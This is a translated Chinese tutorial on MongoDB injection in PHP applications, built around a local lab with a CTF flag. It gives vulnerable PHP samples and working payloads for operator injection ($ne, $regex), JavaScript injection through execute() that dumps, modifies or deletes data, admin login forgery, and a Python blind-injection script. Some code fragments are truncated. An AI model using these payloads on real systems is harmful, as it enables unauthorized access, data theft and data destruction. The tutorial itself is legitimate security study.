# MongoDB特性注入
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
**MongoDB**
> MongoDB 属于 NoSQL
> 数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。
>
> MongoDB 将数据存储为一个文档，数据结构由键值(key=>value)对组成。MongoDB 文档类似于 JSON
> 对象。字段值可以包含其他文档，数组及文档数组。
MongDB 数据库一共两个端口
> 27017: MongDB的数据库端口
>
> 28017: MongDB的web管理接口
php5 的 MongoDB 扩展比 php7 的好用，测试最好用 php5 的 MongoDB 扩展，本文所有环境均在 **php
5.5.9|MongoDB 2.0.4** 下测试，windows系统，如有更换环境会提前注释说明。安装 MongDB
扩展[在这](https://pecl.php.net/package/mongo/1.6.10/windows)，两版本操作对比如下
php5
    (new MongoClient())->{$db}->{$collection}->findOne(['_id' => $id]);
php7
    $mongo = new MongoDB\Driver\Manager();
    $query = new MongoDB\Driver\Query(array(
        '_id'=>$id
    ));
    $result = $mongo->executeQuery('db.collection', $query)->toArray();
    // 返回的$result是一个对象，需要 toArray() 转换成数组。
## 基础概念
SQL 概念 | MongoDB 概念 | 说明  
---|---|---  
database | database | 数据库  
table | collection | 数据库表/集合  
row | document | 数据记录行/文档  
column | field | 数据字段/域  
index | index | 索引  
table joins |  | 表连接，MongoDB 不支持  
primary key | primary key | 主键，MongoDB 自动将 `_id` 字段设置为主键  
## 基础语法
开启数据库
    mongod -dbpath 绝对路径\data\db
连接数据库
    mongo
显示所有数据库的列表
    show dbs
使用/创建数据库
    use test
删除数据库
    db.dropDatabase()
创建集合
    db.createCollection("users")
    # 创建固定集合 history，整个集合空间大小 6142800 B, 文档最大个数为 10000 个
    db.createCollection("history", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )
    # 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合
    db.users.insert({"username" : "admin", "password": "admin123"})
删除集合
    db.users.drop()
插入文档
    db.users.insert({
        username:"admin",
        password:"admin123"
    })
更新文档
    db.users.update({'password':'admin123'},{$set:{'password':'flag{Mo4g0_1nj3cti0n_g4m2!}'}})
save
    db.users.save(
       ,
       {
         writeConcern: 
       }
    )
删除文档
    db.users.remove(
       ,
       {
         justOne: ,
         writeConcern: 
       }
    )
格式化(使得输出更美观)
    > db.users.find({username:'admin'}).pretty()
    {
            "_id" : ObjectId("611102a8093f2b542d000029"),
            "userid" : 0,
            "username" : "admin",
            "password" : "flag{Mo4g0_1nj3cti0n_g4m2!}"
    }
## 注入方式
首先初始化一个用户组，方便后续测试，运行或者访问皆可
    test;
    $coll = $db->users;
    $ch = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwsyz';
    $data = array(
        'userid'=>0,
        'username'=>'admin',
        'password'=>'flag{Mo4g0_1nj3cti0n_g4m2!}'
    );
    $coll->insert($data);
    for ($i=1; $i $i,
            'username'=>'user'.$i,
            'password'=>$str
        );
        $coll->insert($data);
    }
    echo 'Init finish!';
    ?>
###  find查找注入
    #从当前数据库的集合user中查找id大于1文档
    db.users.find({'id':{$gt:1}})
常用语法
    $gt : > {“field”: {$gt: value}}
    $lt : = {“field”: {$gte: value}}
    $lte:  {“member.age”: {$ne: “mine”}}
    $exists 存在与否 {“couponsCode.0”: {$exists: 1}} #数组存在第一条数据
    $in : in 包含 {“member.age”: {$in: [null], “$exists: true”}}
    $or:or || 或者 {“$or”: [{“member.age”: “23”}, {“member.name”: “23333”}]}
    $not: 反匹配(1.3.3及以上版本)
    $and:and && 并且 {“$and”: [{“member.age”: “23”}, {“member.name”: “23333”}]}
    $regex 正则匹配 ({“name”:{“$regex”:’^a$’}})
    $size 元素个数 ({“name”:{“$size”:3}}) # $size name元素数为3
**有回显数组注入**
    test;
    $coll = $db->users;
    $username = $_GET['u'];
    $password = $_GET['p'];
    $data = array(
        'username'=>$username,
        'password'=>$password
    );
    xdebug_var_dump($data);
    $data = $coll->find($data);
    $count = $data->count();
    if ($count>0) {
        foreach ($data as $user) {
            echo 'username:'.$user['username']."";
            echo 'password:'.$user['password']."";
        }
    }
    else{
        echo 'Cannot find users :(';
    }
    ?>
结合 php 可以传递数组的性质，我们在不知道账号密码的情况下通过不等于带出
    db.users.find({"username": {"$ne": "1"},"password": {"$ne": "1"}})
也就是
    ?u[$ne]=1&p[$ne]=1
如果为了匹配其中一条信息，则可以用 $regex 带出
    > db.users.find({"username": {"$regex": "^a"},"password": {"$regex": ".*"}})
    { "_id" : ObjectId("610fac3edb8c2e7a7384e3e9"), "password" : "flag{Mo4g0_1nj3cti0n_g4m2!}", "username" : "admin" }
也就是
    ?u[$regex]=^a&p[$regex]=.*
**有回显拼接注入**
    test;
    xdebug_var_dump($query);
    $data = $db->execute($query);
    if ($data['ok'] == 1) {
        if ($data['retval']!=NULL) {
            echo 'username:'.$data['retval']['username']."";
            echo 'password:'.$data['retval']['password']."";
        }else{
            echo 'Cannot find users :(';
        }
    }else{
        echo $data['errmsg'];
    }
    ?>
这一次就无法进行数组注入了, 因为数组拼接后会只显示 Array 字眼, 需要拼接 function 内的语句进行注入
    ?u=&p='});var data=db.users.findOne({"username": {"$ne": "1"},"password": {"$ne": "1"}});return data;}//
自己窜写 data 变量，相当于重新赋值
    function(){var data = db.users.findOne({username:'',password:''});var data=db.users.findOne({"username": {"$ne": "1"},"password": {"$ne": "1"}});return data;}
    //'});return data;}
也可以直接从 return 下手
    u=&p='});return db.users.findOne({"username": {"$ne": "1"},"password": {"$ne": "1"}});}//
好像是高版本不支持注释，那就尝试其它的payload
    ?u=&p='});var data=db.users.findOne({'username': {'$ne': '1'},'password': {'$ne': '1'}});var fuck=({'test':'1
    ?u=&p='});data=db.users.findOne({'username': {'$ne': '1'},'password': {'$ne': '1'}});var fuck=({'test':'1
覆盖值的时候多赋值一个变量
这种情况下也可以理所当然的查值，爆版本集合，类似联合注入
    ?u='});return ({username:db.version(),password:tojson(db)});var fuck = ({'test':'&p=1
    ?u='});return ({username:db.version(),password:tojson(db.getCollectionNames())});var fuck = ({'test':'&p=1
    ?u='});return ({username:db.version(),password:tojson(db.users.find())});var fuck = ({'test':'&p=1
这样子会爆出类似 mongdb find() 函数的脚本
那就一行行带出
    ?u='});return ({username:db.version(),password:tojson(db.users.find()[0])});var fuck = ({'test':'&p=1
既然有这样的function可插入那么中间就可以进行多条语句执行
    # 添加
    ?u='});db.users.insert({username:'hack',password:'hack'});return ({username:db.version(),password:tojson(db.users.find()[0])});var fuck = ({'test':'&p=1
    # 删除
    ?u='});db.users.remove({username:'hack',password:'hack'});return ({username:db.version(),password:tojson(db.users.find()[0])});var fuck = ({'test':'&p=1
    # 更新
    ?u='});db.users.update({username:'test'},{$set:{'password':'12345678'}});return ({username:db.version(),password:tojson(db.users.find()[0])});var fuck = ({'test':'&p=1
    # 删库
    ?u='});db.users.remove({});return ({username:db.version(),password:tojson(db.users.find()[0])});var fuck = ({'test':'&p=1
可以这么做的原因我们可以跟进一下 execute 方法，会发现是直接执行一条数据库的命令。
可能是太危险了… MongoDB 2.4 之后 `db` 属性就已经访问不到了，也就是我们不能再通过上述语句进行操作了。
**find 布尔盲注**
    test;
    xdebug_var_dump($query);
    $data = $db->execute($query);
    if ($data['ok'] == 1) {
        if ($data['retval']!=NULL) {
            if($data['retval']['username'] == 'admin') {
                echo 'welcome admin';
            }else{
                echo 'welcome user, you are not admin!';
            }
        }else{
            echo 'Cannot find users :(';
        }
    }else{
        echo $data['errmsg'];
    }
    ?>
也就是要是成功查询到了这一条一句就会给出正确回应，相反则是给出查无此用户的回应，我们可以通过 **伪造admin** 进行登录，在不知道密码的情况下
    ?u='});return ({username:'admin',password:''});var fuck = ({'test':'&p=1
如果想要爆出集合和数据，得利用判断条件
    ?u='});if(db.version()[0]=='2'){return ({username:'admin',password:''})};var fuck = ({'test':'&p=1
通过是否登录为 admin 来判断字符是否正确
然后就是写脚本注入，本人还是喜欢二分法，速度快，也就是 `==` 需要替换为 `>` 或者
`> 1
                payload = "'});if(db.version()" + f"[{i}]>'{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
                payload = "'});if(tojson(db)" + f"[{i}]>'{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
                payload = "'});if(tojson(db.getCollectionNames())" + f"[{i}]>'{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
                payload = "'});if(tojson(db.users.find()[0])" + f"[{i}]>'{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
                data = {
                    'u': payload,
                    'p': '1'
                }
                # print(data)
                res = requests.get(url=url, params=data)
                if "welcome admin" in res.text:
                    low = mid + 1
                else:
                    high = mid
            if low != 32:
                flag += chr(low)
                print(flag)
            # 有时候卡顿会直接 break 退出, 所以注释掉了